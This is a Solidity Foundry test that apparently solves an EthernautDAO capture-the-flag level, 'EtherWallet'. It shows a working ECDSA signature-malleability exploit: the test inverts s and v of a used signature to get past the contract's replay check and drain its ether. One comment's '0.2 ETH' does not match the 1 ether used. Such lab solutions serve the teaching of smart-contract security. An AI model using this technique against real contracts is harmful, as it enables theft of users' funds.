// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../../src/ethernautDao/level9/EtherWallet.sol";

contract EtherWalletTest is Test {
    EtherWallet public etherwallet;
    address alice;
    bytes32 ethMessageHash;

    function setUp() public {
        alice = vm.addr(1);
        vm.prank(alice);
        etherwallet = new EtherWallet();

        vm.deal(address(etherwallet), 1 ether);
    }

    function generateSignature() public returns (uint8 v, bytes32 r, bytes32 s, bytes memory sig) {
        ethMessageHash = keccak256("\x19Ethereum Signed Message:\n32");
        (v, r, s) = vm.sign(1, ethMessageHash);

        // full sig ie. length == 65
        sig = abi.encodePacked(r, s, v);
    }

    function testAttack() public {
        (uint8 v, bytes32 r, bytes32 s, bytes memory sig) = generateSignature();
        // verify signature
        address signer = ecrecover(ethMessageHash, v, r, s);
        assertEq(alice, signer);

        vm.prank(alice);

        // If we try to withdraw using the same signature the contract should revert
        etherwallet.withdraw(sig);

        // increase etherwallet balance
        vm.deal(address(etherwallet), 1 ether);

        address player = vm.addr(2);
        vm.startPrank(player);
        vm.expectRevert(bytes("Signature already used!"));
        etherwallet.withdraw(sig);

        // Now we can calculate what should be the "inverted signature"
        bytes32 groupOrder = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 invertedS = bytes32(uint256(groupOrder) - uint256(s));
        uint8 invertedV = v == 27 ? 28 : 27;

        // After calculating which is the inverse `s` and `v` we just need to re-create the signature
        bytes memory invertedSignature = abi.encodePacked(r, invertedS, invertedV);

        // And use it to trigger again the withdraw
        // If everything works as expected we should have drained the contract from the 0.2 ETH in its balance
        etherwallet.withdraw(invertedSignature);

        vm.stopPrank();

        // // Assert we were able to withdraw all the ETH
        assertEq(player.balance, 1 ether);
        // assertEq(address(etherwallet).balance, 0 ether);
        assertEq(alice.balance, 1 ether);
    }
}
